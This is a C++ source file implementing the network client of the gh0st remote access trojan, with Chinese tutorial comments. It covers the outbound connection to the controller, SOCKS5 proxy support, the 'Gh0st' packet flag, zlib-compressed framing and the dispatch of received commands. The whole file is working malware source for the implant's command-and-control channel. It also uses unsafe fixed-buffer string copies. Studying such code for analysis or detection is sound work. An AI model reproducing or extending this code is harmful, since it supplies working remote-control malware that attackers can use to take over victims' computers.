// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "ClientSocket.h"
#include "../../common/zlib/zlib.h"
#include <process.h>
#include <MSTcpIP.h>
#include "common/Manager.h"
#include "common/until.h"
#pragma comment(lib, "ws2_32.lib")

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

int		CClientSocket::m_nProxyType = PROXY_NONE;
char	CClientSocket::m_strProxyHost[256] = { 0 };
UINT	CClientSocket::m_nProxyPort = 1080;
char	CClientSocket::m_strUserName[256] = { 0 };
char	CClientSocket::m_strPassWord[256] = { 0 };

CClientSocket::CClientSocket()
{
	//---初始化套接字
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	m_hEvent = CreateEvent(NULL, true, false, NULL);
	m_bIsRunning = false;
	m_Socket = INVALID_SOCKET;
	// Packet Flag;
	BYTE bPacketFlag[] = { 'G', 'h', '0', 's', 't' };    //注意这个数据头 ，在讲解gh0st主控端的时候我就说过，要一致
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
}
//---析构函数 用于类的销毁
CClientSocket::~CClientSocket()
{
	m_bIsRunning = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);

	if (m_Socket != INVALID_SOCKET)
		Disconnect();

	CloseHandle(m_hWorkerThread);
	CloseHandle(m_hEvent);
	WSACleanup();
}

//---向主控端发起连接
bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{
	// 一定要清除一下，不然socket会耗尽系统资源
	Disconnect();
	// 重置事件对像
	ResetEvent(m_hEvent);
	m_bIsRunning = false;//链接状态否
	//判断链接类型
	if (m_nProxyType != PROXY_NONE && m_nProxyType != PROXY_SOCKS_VER4 && m_nProxyType != PROXY_SOCKS_VER5)
		return false;
	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (m_Socket == SOCKET_ERROR)
	{
		return false;
	}

	hostent* pHostent = NULL;
	if (m_nProxyType != PROXY_NONE)
		pHostent = gethostbyname(m_strProxyHost);
	else
		pHostent = gethostbyname(lpszHost);

	if (pHostent == NULL)
		return false;

	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family = AF_INET;
	if (m_nProxyType != PROXY_NONE)
		ClientAddr.sin_port = htons(m_nProxyPort);
	else
		ClientAddr.sin_port = htons(nPort);

	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)
		return false;
	// 禁用Nagle算法后，对程序效率有严重影响
	// The Nagle algorithm is disabled if the TCP_NODELAY option is enabled 
	//   const char chOpt = 1;
	// 	int nErr = setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));

		// 验证socks5服务器
	if (m_nProxyType == PROXY_SOCKS_VER5 && !ConnectProxyServer(lpszHost, nPort))
	{
		return false;
	}
	// 不用保活机制，自己用心跳实瑞

	const char chOpt = 1; // True
	// Set KeepAlive 开启保活机制, 防止服务端产生死连接
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
	{
		// 设置超时详细信息
		tcp_keepalive	klive;
		klive.onoff = 1; // 启用保活
		klive.keepalivetime = 1000 * 60 * 3; // 3分钟超时 Keep Alive
		klive.keepaliveinterval = 1000 * 5; // 重试间隔为5秒 Resend if No-Reply
		WSAIoctl
		(
			m_Socket,
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			(unsigned long *)&chOpt,
			0,
			NULL
		);
	}

	m_bIsRunning = true;
	//---连接成功，开启工作线程  转到WorkThread
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);

	return true;
}



bool CClientSocket::ConnectProxyServer(LPCTSTR lpszHost, UINT nPort)
{
	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;
	fd_set fdRead;
	int	nRet = SOCKET_ERROR;

	char buff[600];
	struct socks5req1 m_proxyreq1;
	m_proxyreq1.Ver = PROXY_SOCKS_VER5;
	m_proxyreq1.nMethods = 2;
	m_proxyreq1.Methods[0] = 0;
	m_proxyreq1.Methods[1] = 2;
	send(m_Socket, (char *)&m_proxyreq1, sizeof(m_proxyreq1), 0);
	struct socks5ans1 *m_proxyans1;
	m_proxyans1 = (struct socks5ans1 *)buff;
	memset(buff, 0, sizeof(buff));


	FD_ZERO(&fdRead);
	FD_SET(m_Socket, &fdRead);
	nRet = select(0, &fdRead, NULL, NULL, &tvSelect_Time_Out);

	if (nRet <= 0)
	{
		closesocket(m_Socket);
		return false;
	}
	recv(m_Socket, buff, sizeof(buff), 0);
	if (m_proxyans1->Ver != 5 || (m_proxyans1->Method != 0 && m_proxyans1->Method != 2))
	{
		closesocket(m_Socket);
		return false;
	}


	if (m_proxyans1->Method == 2 && strlen(m_strUserName) > 0)
	{
		int nUserLen = strlen(m_strUserName);
		int nPassLen = strlen(m_strPassWord);
		struct authreq m_authreq;
		memset(&m_authreq, 0, sizeof(m_authreq));
		m_authreq.Ver = PROXY_SOCKS_VER5;
		m_authreq.Ulen = nUserLen;
		lstrcpy(m_authreq.NamePass, m_strUserName);
		memcpy(m_authreq.NamePass + nUserLen, &nPassLen, sizeof(int));
		lstrcpy(m_authreq.NamePass + nUserLen + 1, m_strPassWord);

		int len = 3 + nUserLen + nPassLen;

		send(m_Socket, (char *)&m_authreq, len, 0);

		struct authans *m_authans;
		m_authans = (struct authans *)buff;
		memset(buff, 0, sizeof(buff));

		FD_ZERO(&fdRead);
		FD_SET(m_Socket, &fdRead);
		nRet = select(0, &fdRead, NULL, NULL, &tvSelect_Time_Out);

		if (nRet <= 0)
		{
			closesocket(m_Socket);
			return false;
		}

		recv(m_Socket, buff, sizeof(buff), 0);
		if (m_authans->Ver != 5 || m_authans->Status != 0)
		{
			closesocket(m_Socket);
			return false;
		}
	}

	hostent* pHostent = gethostbyname(lpszHost);
	if (pHostent == NULL)
		return false;

	struct socks5req2 m_proxyreq2;
	m_proxyreq2.Ver = 5;
	m_proxyreq2.Cmd = 1;
	m_proxyreq2.Rsv = 0;
	m_proxyreq2.Atyp = 1;
	m_proxyreq2.IPAddr = *(ULONG*)pHostent->h_addr_list[0];
	m_proxyreq2.Port = ntohs(nPort);

	send(m_Socket, (char *)&m_proxyreq2, 10, 0);
	struct socks5ans2 *m_proxyans2;
	m_proxyans2 = (struct socks5ans2 *)buff;
	memset(buff, 0, sizeof(buff));

	FD_ZERO(&fdRead);
	FD_SET(m_Socket, &fdRead);
	nRet = select(0, &fdRead, NULL, NULL, &tvSelect_Time_Out);

	if (nRet <= 0)
	{
		closesocket(m_Socket);
		return false;
	}

	recv(m_Socket, buff, sizeof(buff), 0);
	if (m_proxyans2->Ver != 5 || m_proxyans2->Rep != 0)
	{
		closesocket(m_Socket);
		return false;
	}

	return true;
}

//工作线程，参数是这个类的this指针
DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)
{
	CClientSocket *pThis = (CClientSocket *)lparam;
	char	buff[MAX_RECV_BUFFER]; //最大接受长度，定义在服务端和控制端共有的包含文件macros.h中
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	while (pThis->IsRunning())                //---如果主控端 没有退出，就一直陷在这个循环中，判断是否在连接的状态
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);   //---这里判断是否断开连接
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();//断开后的清理操作
			break;
		}
		if (nRet > 0)
		{
			memset(buff, 0, sizeof(buff));
			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);     //---接收主控端发来的数据
			if (nSize <= 0)
			{
				pThis->Disconnect();//---接收错误处理
				break;
			}
			if (nSize > 0) pThis->OnRead((LPBYTE)buff, nSize);    //---正确接收就调用 OnRead处理 转到OnRead
		}
	}

	return -1;
}

void CClientSocket::run_event_loop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}

bool CClientSocket::IsRunning()
{
	return m_bIsRunning;
}


//处理接受到的数据
void CClientSocket::OnRead(LPBYTE lpBuffer, DWORD dwIoSize)
{
	try
	{
		if (dwIoSize == 0)
		{
			Disconnect();       //---错误处理
			return;
		}
		//---数据包错误 要求重新发送
		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// 重新发送	
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}
		// Add the message to out message
		// Dont forget there could be a partial, 1, 1 or more + partial mesages
		m_CompressionBuffer.Write(lpBuffer, dwIoSize);


		// Check real Data
		//--- 检测数据是否大于数据头大小 如果不是那就不是正确的数据
		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
			//---判断数据头 就是  构造函数的 g h 0 s t  主控端也讲过的
			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
				throw "bad buffer";

			int nSize = 0;
			CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));

			//--- 数据的大小正确判断
			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
				//---得到传输来的数据
				// Read off header
				m_CompressionBuffer.Read((PBYTE)bPacketFlag, sizeof(bPacketFlag));
				m_CompressionBuffer.Read((PBYTE)&nSize, sizeof(int));
				m_CompressionBuffer.Read((PBYTE)&nUnCompressLength, sizeof(int));
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data
				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];
				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];

				if (pData == NULL || pDeCompressionData == NULL)
					throw "bad Allocate";

				m_CompressionBuffer.Read(pData, nCompressLength);

				//////////////////////////////////////////////////////////////////////////
				//---还记得主控端么？？  还是解压数据看看是否成功，如果成功则向下进行
				unsigned long	destLen = nUnCompressLength;
				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
				//////////////////////////////////////////////////////////////////////////
				if (nRet == Z_OK)//---如果解压成功
				{
					m_DeCompressionBuffer.ClearBuffer();
					m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
					//调用	m_pManager->OnReceive函数  转到m_pManager 定义
					m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
				}
				else
					throw "bad buffer";

				delete[] pData;
				delete[] pDeCompressionData;
			}
			else
				break;
		}
	}
	catch (...)
	{
		m_CompressionBuffer.ClearBuffer();
		Send(NULL, 0);
	}

}


//取消链接
void CClientSocket::Disconnect()
{
	// If we're supposed to abort the connection, set the linger value
	// on the socket to 0.
	//如果我们要终止连接，请设置linger值
	LINGER lingerStruct;
	lingerStruct.l_onoff = 1;
	lingerStruct.l_linger = 0;
	/*设置套接选项
	 setsockopt(
					int socket,					// 参数socket是套接字描述符
					int level,					// 第二个参数level是被设置的选项的级别，如果想要在套接字级别上设置选项，就必须把level设置为 SOL_SOCKET
					int option_name,			// option_name指定准备设置的选项，这取决于level
												// SO_LINGER，如果选择此选项, close或 shutdown将等到所有套接字里排队的消息成功发送或到达延迟时间后才会返回. 否则, 调用将立即返回。
													该选项的参数（option_value)是一个linger结构：
														struct linger {
															int   l_onoff;
															int   l_linger;
														};
													如果linger.l_onoff值为0(关闭），则清 sock->sk->sk_flag中的SOCK_LINGER位；否则，置该位，并赋sk->sk_lingertime值为 linger.l_linger。
					const void *option_value,	//LINGER结构
					size_t ption_len			//LINGER大小
	 );
	 */
	setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct));

	//取消由调用线程为指定文件发出的所有未决输入和输出（I / O）操作。该功能不会取消其他线程为文件句柄发出的I / O操作。
	CancelIo((HANDLE)m_Socket);
	//原子操作
	InterlockedExchange((LPLONG)&m_bIsRunning, false);
	closesocket(m_Socket);
	// 设置事件的状态为有标记，释放任意等待线程。
	SetEvent(m_hEvent);
	//INVALID_SOCKET不是有效的套接字
	m_Socket = INVALID_SOCKET;
}

int CClientSocket::Send(LPBYTE lpData, UINT nSize)
{

	m_WriteBuffer.ClearBuffer();

	if (nSize > 0)
	{
		// Compress data
		unsigned long	destLen = (double)nSize * 1.001 + 12;
		LPBYTE			pDest = new BYTE[destLen];

		if (pDest == NULL)
			return 0;

		int	nRet = compress(pDest, &destLen, lpData, nSize);

		if (nRet != Z_OK)
		{
			delete[] pDest;
			return -1;
		}

		//////////////////////////////////////////////////////////////////////////
		LONG nBufLen = destLen + HDR_SIZE;
		// 5 bytes packet flag
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE)&nBufLen, sizeof(nBufLen));
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE)&nSize, sizeof(nSize));
		// Write Data
		m_WriteBuffer.Write(pDest, destLen);
		delete[] pDest;

		// 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		CopyMemory(lpResendWriteBuffer, lpData, nSize);
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
		if (lpResendWriteBuffer)
			delete[] lpResendWriteBuffer;
	}
	else // 要求重发, 只发送FLAG
	{
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
	}

	// 分块发送
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}


int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	int			size = 0;
	int			nSend = 0;
	int			nSendRetry = 15;
	int			i = 0;
	// 依次发送
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;

		nSend += nRet;
		pbuf += nSplitSize;
		Sleep(10); // 必要的Sleep,过快会引起控制端数据混乱
	}
	// 发送最后的部分
	if (size > 0)
	{
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		nSend += nRet;
	}
	if (nSend == nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}

void CClientSocket::setManagerCallBack(CManager *pManager)
{
	m_pManager = pManager;
}

void CClientSocket::setGlobalProxyOption(int nProxyType /*= PROXY_NONE*/, LPCTSTR lpszProxyHost /*= NULL*/,
	UINT nProxyPort /*= 1080*/, LPCTSTR lpszUserName /*= NULL*/, LPCSTR lpszPassWord /*= NULL*/)
{
	memset(m_strProxyHost, 0, sizeof(m_strProxyHost));
	memset(m_strUserName, 0, sizeof(m_strUserName));
	memset(m_strPassWord, 0, sizeof(m_strPassWord));

	m_nProxyType = nProxyType;
	if (lpszProxyHost != NULL)
		lstrcpy(m_strProxyHost, lpszProxyHost);

	m_nProxyPort = nProxyPort;
	if (lpszUserName != NULL)
		lstrcpy(m_strUserName, lpszUserName);
	if (lpszPassWord != NULL)
		lstrcpy(m_strPassWord, lpszPassWord);
}
